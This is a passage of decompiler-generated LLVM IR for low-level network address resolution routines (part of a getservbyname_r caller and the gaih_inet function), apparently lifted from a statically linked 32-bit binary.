  %v3_805cb53 = inttoptr i32 %v2_805cb53 to i32*
  store i32 %v1_805cb50, i32* %v3_805cb53, align 4
  %v5_805cb54 = add i32 %v2_805cb3b, -32
  %v6_805cb54 = inttoptr i32 %v5_805cb54 to i32*
  store i32 %v0_805cb27, i32* %v6_805cb54, align 4
  %v9_805cb57 = call i32 @getservbyname_r(i32 %v0_805cb2a, i32 %v0_805cb27, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_805cb57, i32* %eax.global-to-local, align 4
  %v0_805cb5c = load i32, i32* @esp, align 4
  %v1_805cb5c = add i32 %v0_805cb5c, 32
  %v1_805cb5f = icmp eq i32 %v9_805cb57, 0
  %v1_805cb61 = icmp eq i1 %v1_805cb5f, false
  br i1 %v1_805cb61, label %dec_label_pc_805cb6b, label %dec_label_pc_805cb63

dec_label_pc_805cb63:                             ; preds = %dec_label_pc_805cb35
  %v3_805cb63 = load i32, i32* %stack_var_-20, align 4
  %v4_805cb63 = icmp eq i32 %v3_805cb63, 0
  %v1_805cb67 = icmp eq i1 %v4_805cb63, false
  br i1 %v1_805cb67, label %dec_label_pc_805cb74, label %dec_label_pc_805cba7

dec_label_pc_805cb6b:                             ; preds = %dec_label_pc_805cb35
  %v9_805cb6b = icmp eq i32 %v9_805cb57, 34
  %v1_805cb6e = icmp eq i1 %v9_805cb6b, false
  br i1 %v1_805cb6e, label %dec_label_pc_805cba7, label %dec_label_pc_805cb70

dec_label_pc_805cb70:                             ; preds = %dec_label_pc_805cb6b
  %v0_805cb70 = load i32, i32* @esi, align 4
  %v2_805cb70 = mul i32 %v0_805cb70, 2
  br label %dec_label_pc_805cb35

dec_label_pc_805cb74:                             ; preds = %dec_label_pc_805cb63
  %v0_805cb74 = load i32, i32* @edi, align 4
  %v1_805cb74 = inttoptr i32 %v0_805cb74 to i32*
  store i32 0, i32* %v1_805cb74, align 4
  %v0_805cb7a = load i32, i32* @ebx, align 4
  %v1_805cb7a = inttoptr i32 %v0_805cb7a to i8*
  %v2_805cb7a = load i8, i8* %v1_805cb7a, align 1
  %v3_805cb7a = sext i8 %v2_805cb7a to i32
  store i32 %v3_805cb7a, i32* %eax.global-to-local, align 4
  %v1_805cb7d = load i32, i32* @edi, align 4
  %v2_805cb7d = add i32 %v1_805cb7d, 4
  %v3_805cb7d = inttoptr i32 %v2_805cb7d to i32*
  store i32 %v3_805cb7a, i32* %v3_805cb7d, align 4
  %v0_805cb80 = load i32, i32* @ebx, align 4
  %v1_805cb80 = add i32 %v0_805cb80, 2
  %v2_805cb80 = inttoptr i32 %v1_805cb80 to i8*
  %v3_805cb80 = load i8, i8* %v2_805cb80, align 1
  %v4_805cb80 = and i8 %v3_805cb80, 2
  %v5_805cb80 = icmp eq i8 %v4_805cb80, 0
  br i1 %v5_805cb80, label %dec_label_pc_805cb95, label %dec_label_pc_805cb86

dec_label_pc_805cb86:                             ; preds = %dec_label_pc_805cb74
  store i32 %v0_805cb2a, i32* %edx.global-to-local, align 4
  %v1_805cb89 = add i32 %v0_805cb2a, 12
  %v2_805cb89 = inttoptr i32 %v1_805cb89 to i32*
  %v3_805cb89 = load i32, i32* %v2_805cb89, align 4
  br label %dec_label_pc_805cb99

dec_label_pc_805cb95:                             ; preds = %dec_label_pc_805cb74
  %v1_805cb95 = add i32 %v0_805cb80, 1
  %v2_805cb95 = inttoptr i32 %v1_805cb95 to i8*
  %v3_805cb95 = load i8, i8* %v2_805cb95, align 1
  %v4_805cb95 = sext i8 %v3_805cb95 to i32
  br label %dec_label_pc_805cb99

dec_label_pc_805cb99:                             ; preds = %dec_label_pc_805cb86, %dec_label_pc_805cb95
  %storemerge2 = phi i32 [ %v3_805cb89, %dec_label_pc_805cb86 ], [ %v4_805cb95, %dec_label_pc_805cb95 ]
  %v1_805cb99 = load i32, i32* @edi, align 4
  %v2_805cb99 = add i32 %v1_805cb99, 8
  %v3_805cb99 = inttoptr i32 %v2_805cb99 to i32*
  store i32 %storemerge2, i32* %v3_805cb99, align 4
  %v3_805cb9c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805cb9c, i32* %eax.global-to-local, align 4
  %v1_805cb9f = add i32 %v3_805cb9c, 8
  %v2_805cb9f = inttoptr i32 %v1_805cb9f to i32*
  %v3_805cb9f = load i32, i32* %v2_805cb9f, align 4
  store i32 %v3_805cb9f, i32* %eax.global-to-local, align 4
  %v1_805cba2 = load i32, i32* @edi, align 4
  %v2_805cba2 = add i32 %v1_805cba2, 12
  %v3_805cba2 = inttoptr i32 %v2_805cba2 to i32*
  store i32 %v3_805cb9f, i32* %v3_805cba2, align 4
  br label %dec_label_pc_805cba7

dec_label_pc_805cba7:                             ; preds = %dec_label_pc_805cb6b, %dec_label_pc_805cb63, %dec_label_pc_805cb99
  %storemerge1 = phi i32 [ 0, %dec_label_pc_805cb99 ], [ 264, %dec_label_pc_805cb63 ], [ 264, %dec_label_pc_805cb6b ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  %v2_805cbaa = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805cbaa, i32* @ebx, align 4
  store i32 %v0_805cb20, i32* @esi, align 4
  store i32 %v0_805cb1f, i32* @edi, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_805cb2a, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_805cba7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805cb99, { 1, 0 }
}

define i32 @gaih_inet(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp108 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-148 = alloca i8*, align 4
  %stack_var_4 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_4, align 4
  %tmp118 = inttoptr i32 %arg3 to i8*
  %stack_var_-114 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-252 = alloca i8*, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-221 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %v0_805cbb4 = load i32, i32* @ebx, align 4
  %v2_805cbbb = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805cbbb, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 %v2_805cbbb, i32* %stack_var_-20, align 4
  store i32 0, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_805cbce = add i32 %arg3, 4
  %v2_805cbce = inttoptr i32 %v1_805cbce to i32*
  %v3_805cbce = load i32, i32* %v2_805cbce, align 4
  store i32 %v3_805cbce, i32* %eax.global-to-local, align 4
  %v1_805cbd1 = icmp eq i32 %v3_805cbce, 0
  br i1 %v1_805cbd1, label %dec_label_pc_805cbe4, label %dec_label_pc_805cbd5

dec_label_pc_805cbd5:                             ; preds = %entry
  store i32 0, i32* %stack_var_-156, align 4
  %v9_805cbdf = icmp eq i32 %v3_805cbce, 10
  %v1_805cbe2 = icmp eq i1 %v9_805cbdf, false
  br i1 %v1_805cbe2, label %dec_label_pc_805cbfa, label %dec_label_pc_805cbe4

dec_label_pc_805cbe4:                             ; preds = %dec_label_pc_805cbd5, %entry
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_805cbe7 = inttoptr i32 %arg3 to i32*
  %v2_805cbe7 = load i32, i32* %v1_805cbe7, align 4
  %v1_805cbe9 = udiv i32 %v2_805cbe7, 8
  %v1_805cbf1 = urem i32 %v1_805cbe9, 2
  store i32 %v1_805cbf1, i32* %eax.global-to-local, align 4
  store i32 %v1_805cbf1, i32* %stack_var_-156, align 4
  br label %dec_label_pc_805cbfa

dec_label_pc_805cbfa:                             ; preds = %dec_label_pc_805cbd5, %dec_label_pc_805cbe4
  store i32 %v2_805cbbb, i32* %eax.global-to-local, align 4
  %v3_805cc03 = bitcast i32* %stack_var_-48 to i8*
  %v4_805cc03 = call i32 @__GI_memset(i8* %v3_805cc03, i32 0, i32 16)
  store i32 %v4_805cc03, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_805cc0e = add i32 %arg3, 12
  %v2_805cc0e = inttoptr i32 %v1_805cc0e to i32*
  %v3_805cc0e = load i32, i32* %v2_805cc0e, align 4
  store i32 %v3_805cc0e, i32* @ecx, align 4
  %v1_805cc11 = icmp eq i32 %v3_805cc0e, 0
  br i1 %v1_805cc11, label %dec_label_pc_805cc1c, label %dec_label_pc_805cbfa.dec_label_pc_805cc2a.preheader_crit_edge

dec_label_pc_805cbfa.dec_label_pc_805cc2a.preheader_crit_edge: ; preds = %dec_label_pc_805cbfa
  %.pre = add i32 %arg3, 8
  %.pre106 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_805cc2a.preheader

dec_label_pc_805cc1c:                             ; preds = %dec_label_pc_805cbfa
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_805cc1f = add i32 %arg3, 8
  %v2_805cc1f = inttoptr i32 %v1_805cc1f to i32*
  %v3_805cc1f = load i32, i32* %v2_805cc1f, align 4
  %v4_805cc1f = icmp eq i32 %v3_805cc1f, 0
  %v1_805cc23 = icmp eq i1 %v4_805cc1f, false
  br i1 %v1_805cc23, label %dec_label_pc_805cc2a.preheader, label %dec_label_pc_805cc7a

dec_label_pc_805cc2a.preheader:                   ; preds = %dec_label_pc_805cbfa.dec_label_pc_805cc2a.preheader_crit_edge, %dec_label_pc_805cc1c
  %v2_805cc3a.pre-phi = phi i32* [ %.pre106, %dec_label_pc_805cbfa.dec_label_pc_805cc2a.preheader_crit_edge ], [ %v2_805cc1f, %dec_label_pc_805cc1c ]
  store i32 ptrtoint (i8** @global_var_806da67.751 to i32), i32* @ebx, align 4
  %v3_805cc2a201 = load i8, i8* inttoptr (i32 add (i32 ptrtoint (i8** @global_var_806da67.751 to i32), i32 3) to i8*), align 1
  %v4_805cc2a202 = zext i8 %v3_805cc2a201 to i32
  %v6_805cc2a203 = and i32 %arg3, -256
  %v7_805cc2a204 = or i32 %v4_805cc2a202, %v6_805cc2a203
  store i32 %v7_805cc2a204, i32* %edx.global-to-local, align 4
  %v4_805cc33205 = icmp eq i8 %v3_805cc2a201, 0
  br i1 %v4_805cc33205, label %dec_label_pc_805cc63, label %dec_label_pc_805cc37

dec_label_pc_805cc27:                             ; preds = %dec_label_pc_805cc52, %dec_label_pc_805cc41
  %v5_805cc2a70 = phi i32 [ %v5_805cc2a69, %dec_label_pc_805cc52 ], [ %v3_805cc3a, %dec_label_pc_805cc41 ]
  %v1_805cc27 = add i32 %v0_805cc27206, 7
  store i32 %v1_805cc27, i32* @ebx, align 4
  %v1_805cc2a = add i32 %v0_805cc27206, 10
  %v2_805cc2a = inttoptr i32 %v1_805cc2a to i8*
  %v3_805cc2a = load i8, i8* %v2_805cc2a, align 1
  %v4_805cc2a = zext i8 %v3_805cc2a to i32
  %v6_805cc2a = and i32 %v5_805cc2a70, -256
  %v7_805cc2a = or i32 %v4_805cc2a, %v6_805cc2a
  store i32 %v7_805cc2a, i32* %edx.global-to-local, align 4
  %v4_805cc33 = icmp eq i8 %v3_805cc2a, 0
  br i1 %v4_805cc33, label %dec_label_pc_805cc63, label %dec_label_pc_805cc37

dec_label_pc_805cc37:                             ; preds = %dec_label_pc_805cc2a.preheader, %dec_label_pc_805cc27
  %v0_805cc27206 = phi i32 [ %v1_805cc27, %dec_label_pc_805cc27 ], [ ptrtoint (i8** @global_var_806da67.751 to i32), %dec_label_pc_805cc2a.preheader ]
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v3_805cc3a = load i32, i32* %v2_805cc3a.pre-phi, align 4
  store i32 %v3_805cc3a, i32* %edx.global-to-local, align 4
  %v1_805cc3d = icmp eq i32 %v3_805cc3a, 0
  br i1 %v1_805cc3d, label %dec_label_pc_805cc48, label %dec_label_pc_805cc41

dec_label_pc_805cc41:                             ; preds = %dec_label_pc_805cc37
  %v1_805cc41 = inttoptr i32 %v0_805cc27206 to i8*
  %v2_805cc41 = load i8, i8* %v1_805cc41, align 1
  %v3_805cc41 = sext i8 %v2_805cc41 to i32
  store i32 %v3_805cc41, i32* %eax.global-to-local, align 4
  %v12_805cc44 = icmp eq i32 %v3_805cc3a, %v3_805cc41
  %v1_805cc46 = icmp eq i1 %v12_805cc44, false
  br i1 %v1_805cc46, label %dec_label_pc_805cc27, label %dec_label_pc_805cc48

dec_label_pc_805cc48:                             ; preds = %dec_label_pc_805cc41, %dec_label_pc_805cc37
  %v5_805cc2a69 = phi i32 [ %v3_805cc3a, %dec_label_pc_805cc41 ], [ 0, %dec_label_pc_805cc37 ]
  br i1 %v1_805cc11, label %dec_label_pc_805cc5a, label %dec_label_pc_805cc4c

dec_label_pc_805cc4c:                             ; preds = %dec_label_pc_805cc48
  %v1_805cc4c = add i32 %v0_805cc27206, 2
  %v2_805cc4c = inttoptr i32 %v1_805cc4c to i8*
  %v3_805cc4c = load i8, i8* %v2_805cc4c, align 1
  %v4_805cc4c = and i8 %v3_805cc4c, 2
  %v5_805cc4c = icmp eq i8 %v4_805cc4c, 0
  %v1_805cc50 = icmp eq i1 %v5_805cc4c, false
  br i1 %v1_805cc50, label %dec_label_pc_805cc5a, label %dec_label_pc_805cc52

dec_label_pc_805cc52:                             ; preds = %dec_label_pc_805cc4c
  %v1_805cc52 = add i32 %v0_805cc27206, 1
  %v2_805cc52 = inttoptr i32 %v1_805cc52 to i8*
  %v3_805cc52 = load i8, i8* %v2_805cc52, align 1
  %v4_805cc52 = sext i8 %v3_805cc52 to i32
  store i32 %v4_805cc52, i32* %eax.global-to-local, align 4
  %v12_805cc56 = icmp eq i32 %v3_805cc0e, %v4_805cc52
  %v1_805cc58 = icmp eq i1 %v12_805cc56, false
  br i1 %v1_805cc58, label %dec_label_pc_805cc27, label %dec_label_pc_805cc5a

dec_label_pc_805cc5a:                             ; preds = %dec_label_pc_805cc52, %dec_label_pc_805cc4c, %dec_label_pc_805cc48
  br label %dec_label_pc_805cc7f

dec_label_pc_805cc63:                             ; preds = %dec_label_pc_805cc27, %dec_label_pc_805cc2a.preheader
  store i32 %arg3, i32* %edx.global-to-local, align 4
  store i32 263, i32* %eax.global-to-local, align 4
  %v3_805cc6b = load i32, i32* %v2_805cc3a.pre-phi, align 4
  %v4_805cc6b = icmp eq i32 %v3_805cc6b, 0
  %v1_805cc6f = icmp eq i1 %v4_805cc6b, false
  br i1 %v1_805cc6f, label %dec_label_pc_805d536, label %dec_label_pc_805d506

dec_label_pc_805cc7a:                             ; preds = %dec_label_pc_805cc1c
  store i32 ptrtoint (i32* @global_var_806da60.752 to i32), i32* @ebx, align 4
  br label %dec_label_pc_805cc7f

dec_label_pc_805cc7f:                             ; preds = %dec_label_pc_805cc5a, %dec_label_pc_805cc7a
  %v0_805cdc9 = phi i32 [ %v0_805cc27206, %dec_label_pc_805cc5a ], [ ptrtoint (i32* @global_var_806da60.752 to i32), %dec_label_pc_805cc7a ]
  %v1_805cc7f = icmp eq i32 %arg2, 0
  br i1 %v1_805cc7f, label %dec_label_pc_805cda9, label %dec_label_pc_805cc87

dec_label_pc_805cc87:                             ; preds = %dec_label_pc_805cc7f
  %v1_805cc87 = add i32 %v0_805cdc9, 2
  %v2_805cc87 = inttoptr i32 %v1_805cc87 to i8*
  %v3_805cc87 = load i8, i8* %v2_805cc87, align 1
  %v4_805cc87 = urem i8 %v3_805cc87, 2
  %v5_805cc87 = icmp eq i8 %v4_805cc87, 0
  %v1_805cc8b = icmp eq i1 %v5_805cc87, false
  br i1 %v1_805cc8b, label %dec_label_pc_805d506, label %dec_label_pc_805cc91

dec_label_pc_805cc91:                             ; preds = %dec_label_pc_805cc87
  %v1_805cc91 = add i32 %arg2, 4
  %v2_805cc91 = inttoptr i32 %v1_805cc91 to i32*
  %v3_805cc91 = load i32, i32* %v2_805cc91, align 4
  %v5_805cc91 = icmp slt i32 %v3_805cc91, 0
  %v1_805cc95 = icmp eq i1 %v5_805cc91, false
  br i1 %v1_805cc95, label %dec_label_pc_805cd60, label %dec_label_pc_805cc9b

dec_label_pc_805cc9b:                             ; preds = %dec_label_pc_805cc91
  %v1_805cc9b = add i32 %v0_805cdc9, 3
  %v2_805cc9b = inttoptr i32 %v1_805cc9b to i8*
  %v3_805cc9b = load i8, i8* %v2_805cc9b, align 1
  %v4_805cc9b = icmp eq i8 %v3_805cc9b, 0
  br i1 %v4_805cc9b, label %dec_label_pc_805ccce, label %dec_label_pc_805cca1

dec_label_pc_805cca1:                             ; preds = %dec_label_pc_805cc9b
  store i32 %arg3, i32* @ecx, align 4
  store i32 %v0_805cdc9, i32* @edx, align 4
  %v8_805ccb0 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v8_805ccb0, i32* %eax.global-to-local, align 4
  store i32 %v8_805ccb0, i32* %stack_var_-20, align 4
  %v1_805ccb7 = inttoptr i32 %arg2 to i32*
  %v2_805ccb7 = load i32, i32* %v1_805ccb7, align 4
  store i32 %v2_805ccb7, i32* @eax, align 4
  %v2_805ccb9 = call i32 @gaih_inet_serv(i32* nonnull %stack_var_-176)
  store i32 %v2_805ccb9, i32* %eax.global-to-local, align 4
  %v1_805ccc1 = icmp eq i32 %v2_805ccb9, 0
  br i1 %v1_805ccc1, label %dec_label_pc_805ce2f, label %dec_label_pc_805d536

dec_label_pc_805ccce:                             ; preds = %dec_label_pc_805cc9b
  %v2_805ccce = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805ccce, i32* @ecx, align 4
  %v1_805ccd1 = add i32 %v0_805cdc9, 7
  store i32 %v1_805ccd1, i32* @esi, align 4
  %v1_805cd4951 = add i32 %v0_805cdc9, 10
  %v2_805cd4952 = inttoptr i32 %v1_805cd4951 to i8*
  %v3_805cd4953 = load i8, i8* %v2_805cd4952, align 1
  %v4_805cd4954 = icmp eq i8 %v3_805cd4953, 0
  %v1_805cd4d60 = icmp eq i1 %v4_805cd4954, false
  br i1 %v1_805cd4d60, label %dec_label_pc_805ccdc.lr.ph, label %dec_label_pc_805cd4f

dec_label_pc_805ccdc.lr.ph:                       ; preds = %dec_label_pc_805ccce
  %v1_805cce8 = add i32 %arg3, 8
  %v2_805cce8 = inttoptr i32 %v1_805cce8 to i32*
  %v8_805cd1c = ptrtoint i32* %stack_var_-176 to i32
  %v1_805cd20 = inttoptr i32 %arg2 to i32*
  br label %dec_label_pc_805ccdc

dec_label_pc_805ccdc:                             ; preds = %dec_label_pc_805ccdc.lr.ph, %dec_label_pc_805cd46
  %v0_805cd13 = phi i32 [ %v1_805ccd1, %dec_label_pc_805ccdc.lr.ph ], [ %v1_805cd46, %dec_label_pc_805cd46 ]
  %stack_var_-152.161 = phi i32 [ %v2_805ccce, %dec_label_pc_805ccdc.lr.ph ], [ %stack_var_-152.0, %dec_label_pc_805cd46 ]
  %v1_805ccdc = add i32 %v0_805cd13, 2
  %v2_805ccdc = inttoptr i32 %v1_805ccdc to i8*
  %v3_805ccdc = load i8, i8* %v2_805ccdc, align 1
  %v4_805ccdc = sext i8 %v3_805ccdc to i32
  store i32 %v4_805ccdc, i32* @ecx, align 4
  %v2_805cce0 = urem i8 %v3_805ccdc, 2
  %v3_805cce0 = icmp eq i8 %v2_805cce0, 0
  %v1_805cce3 = icmp eq i1 %v3_805cce0, false
  br i1 %v1_805cce3, label %dec_label_pc_805cd46, label %dec_label_pc_805cce5

dec_label_pc_805cce5:                             ; preds = %dec_label_pc_805ccdc
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v3_805cce8 = load i32, i32* %v2_805cce8, align 4
  store i32 %v3_805cce8, i32* %edx.global-to-local, align 4
  %v1_805cceb = icmp eq i32 %v3_805cce8, 0
  br i1 %v1_805cceb, label %dec_label_pc_805ccf6, label %dec_label_pc_805ccef

dec_label_pc_805ccef:                             ; preds = %dec_label_pc_805cce5
  %v1_805ccef = inttoptr i32 %v0_805cd13 to i8*
  %v2_805ccef = load i8, i8* %v1_805ccef, align 1
  %v3_805ccef = sext i8 %v2_805ccef to i32
  store i32 %v3_805ccef, i32* %eax.global-to-local, align 4
  %v12_805ccf2 = icmp eq i32 %v3_805cce8, %v3_805ccef
  %v1_805ccf4 = icmp eq i1 %v12_805ccf2, false
  br i1 %v1_805ccf4, label %dec_label_pc_805cd46, label %dec_label_pc_805ccf6

dec_label_pc_805ccf6:                             ; preds = %dec_label_pc_805ccef, %dec_label_pc_805cce5
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v3_805ccf9 = load i32, i32* %v2_805cc0e, align 4
  store i32 %v3_805ccf9, i32* %edx.global-to-local, align 4
  %v1_805ccfc = icmp eq i32 %v3_805ccf9, 0
  br i1 %v1_805ccfc, label %dec_label_pc_805cd0d, label %dec_label_pc_805cd00

dec_label_pc_805cd00:                             ; preds = %dec_label_pc_805ccf6
  %v2_805cd00 = and i8 %v3_805ccdc, 2
  %v3_805cd00 = icmp eq i8 %v2_805cd00, 0
  %v5_805cd00 = zext i8 %v2_805cd00 to i32
  %v7_805cd00 = and i32 %v4_805ccdc, -256
  %v8_805cd00 = or i32 %v7_805cd00, %v5_805cd00
  store i32 %v8_805cd00, i32* @ecx, align 4
  %v1_805cd03 = icmp eq i1 %v3_805cd00, false
  br i1 %v1_805cd03, label %dec_label_pc_805cd0d, label %dec_label_pc_805cd05

dec_label_pc_805cd05:                             ; preds = %dec_label_pc_805cd00
  %v1_805cd05 = add i32 %v0_805cd13, 1
  %v2_805cd05 = inttoptr i32 %v1_805cd05 to i8*
  %v3_805cd05 = load i8, i8* %v2_805cd05, align 1
  %v4_805cd05 = sext i8 %v3_805cd05 to i32
  store i32 %v4_805cd05, i32* %eax.global-to-local, align 4
  %v12_805cd09 = icmp eq i32 %v3_805ccf9, %v4_805cd05
  %v1_805cd0b = icmp eq i1 %v12_805cd09, false
  br i1 %v1_805cd0b, label %dec_label_pc_805cd46, label %dec_label_pc_805cd0d

dec_label_pc_805cd0d:                             ; preds = %dec_label_pc_805cd05, %dec_label_pc_805cd00, %dec_label_pc_805ccf6
  store i32 %arg3, i32* @ecx, align 4
  store i32 %v0_805cd13, i32* @edx, align 4
  store i32 %v8_805cd1c, i32* @ebx, align 4
  %v2_805cd20 = load i32, i32* %v1_805cd20, align 4
  store i32 %v2_805cd20, i32* @eax, align 4
  %v2_805cd22 = call i32 @gaih_inet_serv(i32* nonnull %stack_var_-176)
  store i32 %v2_805cd22, i32* %eax.global-to-local, align 4
  %v1_805cd2a = icmp eq i32 %v2_805cd22, 0
  br i1 %v1_805cd2a, label %dec_label_pc_805cd38, label %dec_label_pc_805cd2e

dec_label_pc_805cd2e:                             ; preds = %dec_label_pc_805cd0d
  %v3_805cd2e = and i32 %v2_805cd22, 256
  %v4_805cd2e = icmp eq i32 %v3_805cd2e, 0
  %v1_805cd31 = icmp eq i1 %v4_805cd2e, false
  br i1 %v1_805cd31, label %dec_label_pc_805cd46, label %dec_label_pc_805d536

dec_label_pc_805cd38:                             ; preds = %dec_label_pc_805cd0d
  store i32 %stack_var_-152.161, i32* %edx.global-to-local, align 4
  %v2_805cd3e = inttoptr i32 %stack_var_-152.161 to i32*
  store i32 %v8_805cd1c, i32* %v2_805cd3e, align 4
  br label %dec_label_pc_805cd46

dec_label_pc_805cd46:                             ; preds = %dec_label_pc_805cd2e, %dec_label_pc_805cd05, %dec_label_pc_805ccef, %dec_label_pc_805ccdc, %dec_label_pc_805cd38
  %stack_var_-152.0 = phi i32 [ %stack_var_-152.161, %dec_label_pc_805ccdc ], [ %v8_805cd1c, %dec_label_pc_805cd38 ], [ %stack_var_-152.161, %dec_label_pc_805cd2e ], [ %stack_var_-152.161, %dec_label_pc_805cd05 ], [ %stack_var_-152.161, %dec_label_pc_805ccef ]
  %v0_805cd46 = load i32, i32* @esi, align 4
  %v1_805cd46 = add i32 %v0_805cd46, 7
  store i32 %v1_805cd46, i32* @esi, align 4
  %v1_805cd49 = add i32 %v0_805cd46, 10
  %v2_805cd49 = inttoptr i32 %v1_805cd49 to i8*
  %v3_805cd49 = load i8, i8* %v2_805cd49, align 1
  %v4_805cd49 = icmp eq i8 %v3_805cd49, 0
  %v1_805cd4d = icmp eq i1 %v4_805cd49, false
  br i1 %v1_805cd4d, label %dec_label_pc_805ccdc, label %dec_label_pc_805cd4f

dec_label_pc_805cd4f:                             ; preds = %dec_label_pc_805cd46, %dec_label_pc_805ccce
  store i32 %v2_805cbbb, i32* %eax.global-to-local, align 4
  %v3_805cd52 = load i32, i32* %stack_var_-20, align 4
  %v15_805cd52 = icmp eq i32 %v3_805cd52, %v2_805cbbb
  %v1_805cd55 = icmp eq i1 %v15_805cd52, false
  br i1 %v1_805cd55, label %dec_label_pc_805ce2f, label %dec_label_pc_805d506

dec_label_pc_805cd60:                             ; preds = %dec_label_pc_805cc91
  %v8_805cd67 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v8_805cd67, i32* %eax.global-to-local, align 4
  store i32 %v8_805cd67, i32* %stack_var_-20, align 4
  store i32 0, i32* %stack_var_-176, align 4
  %v1_805cd73 = inttoptr i32 %v0_805cdc9 to i8*
  %v2_805cd73 = load i8, i8* %v1_805cd73, align 1
  %v3_805cd73 = sext i8 %v2_805cd73 to i32
  store i32 %v8_805cd67, i32* %eax.global-to-local, align 4
  %v2_805cd79 = add i32 %v8_805cd67, 4
  %v3_805cd79 = inttoptr i32 %v2_805cd79 to i32*
  store i32 %v3_805cd73, i32* %v3_805cd79, align 4
  %v3_805cd7c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805cd7c, i32* %edx.global-to-local, align 4
  %v0_805cd7f = load i32, i32* @ebx, align 4
  %v1_805cd7f = add i32 %v0_805cd7f, 2
  %v2_805cd7f = inttoptr i32 %v1_805cd7f to i8*
  %v3_805cd7f = load i8, i8* %v2_805cd7f, align 1
  %v4_805cd7f = and i8 %v3_805cd7f, 2
  %v5_805cd7f = icmp eq i8 %v4_805cd7f, 0
  br i1 %v5_805cd7f, label %dec_label_pc_805cd8d, label %dec_label_pc_805cd85

dec_label_pc_805cd85:                             ; preds = %dec_label_pc_805cd60
  store i32 %arg3, i32* @ecx, align 4
  %v3_805cd88 = load i32, i32* %v2_805cc0e, align 4
  br label %dec_label_pc_805cd91

dec_label_pc_805cd8d:                             ; preds = %dec_label_pc_805cd60
  %v1_805cd8d = add i32 %v0_805cd7f, 1
  %v2_805cd8d = inttoptr i32 %v1_805cd8d to i8*
  %v3_805cd8d = load i8, i8* %v2_805cd8d, align 1
  %v4_805cd8d = sext i8 %v3_805cd8d to i32
  br label %dec_label_pc_805cd91

dec_label_pc_805cd91:                             ; preds = %dec_label_pc_805cd85, %dec_label_pc_805cd8d
  %storemerge12 = phi i32 [ %v3_805cd88, %dec_label_pc_805cd85 ], [ %v4_805cd8d, %dec_label_pc_805cd8d ]
  store i32 %storemerge12, i32* %eax.global-to-local, align 4
  %v2_805cd91 = add i32 %v3_805cd7c, 8
  %v3_805cd91 = inttoptr i32 %v2_805cd91 to i32*
  store i32 %storemerge12, i32* %v3_805cd91, align 4
  %v3_805cd94 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805cd94, i32* %edx.global-to-local, align 4
  %v3_805cd97 = load i32, i32* %v2_805cc91, align 4
  %v1_805cd9a = trunc i32 %v3_805cd97 to i16
  %v2_805cd9a = call i16 @llvm.bswap.i16(i16 %v1_805cd9a)
  %v3_805cd9a = zext i16 %v2_805cd9a to i32
  store i32 %v3_805cd9a, i32* %eax.global-to-local, align 4
  %v2_805cda1 = add i32 %v3_805cd94, 12
  %v3_805cda1 = inttoptr i32 %v2_805cda1 to i32*
  store i32 %v3_805cd9a, i32* %v3_805cda1, align 4
  br label %dec_label_pc_805ce2f

dec_label_pc_805cda9:                             ; preds = %dec_label_pc_805cc7f
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_805cdac = add i32 %arg3, 8
  %v2_805cdac = inttoptr i32 %v1_805cdac to i32*
  %v3_805cdac = load i32, i32* %v2_805cdac, align 4
  %v4_805cdac = icmp eq i32 %v3_805cdac, 0
  %v1_805cdb0 = icmp eq i1 %v4_805cdac, false
  br i1 %v1_805cdb0, label %dec_label_pc_805cdb6, label %dec_label_pc_805cdb2

dec_label_pc_805cdb2:                             ; preds = %dec_label_pc_805cda9
  br i1 %v1_805cc11, label %dec_label_pc_805cdf6, label %dec_label_pc_805cdb6

dec_label_pc_805cdb6:                             ; preds = %dec_label_pc_805cdb2, %dec_label_pc_805cda9
  %v8_805cdbd = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v8_805cdbd, i32* %eax.global-to-local, align 4
  store i32 %v8_805cdbd, i32* %stack_var_-20, align 4
  store i32 0, i32* %stack_var_-176, align 4
  %v1_805cdc9 = inttoptr i32 %v0_805cdc9 to i8*
  %v2_805cdc9 = load i8, i8* %v1_805cdc9, align 1
  %v3_805cdc9 = sext i8 %v2_805cdc9 to i32
  store i32 %v8_805cdbd, i32* %eax.global-to-local, align 4
